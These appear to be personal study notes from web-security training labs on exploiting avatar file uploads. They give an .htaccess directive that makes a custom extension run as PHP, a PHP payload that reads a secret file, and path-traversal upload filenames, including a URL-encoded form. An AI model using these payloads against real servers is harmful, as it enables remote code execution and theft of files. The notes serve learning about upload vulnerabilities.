happens when you can upload an avatar
try classic bypasses
if none work and the server is apache:


    Change the value of the filename parameter to .htaccess.
    Change the value of the Content-Type header to text/plain.

    Replace the contents of the file (your PHP payload) with the following Apache directive:
    AddType application/x-httpd-php .l33t

    This maps an arbitrary extension (.l33t) to the executable MIME type application/x-httpd-php. As the server uses the mod_php module, it knows how to handle this already.


USING FILE UPLOAD TO READ ARBITRARY FILES - path traversal

sometimes the goal is not about code execution but getting information

php file contents:
<?php echo file_get_contents('/home/carlos/secret'); ?>

and these headers 
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"

try this with URL encoding too
filename="..%2fexploit.php"
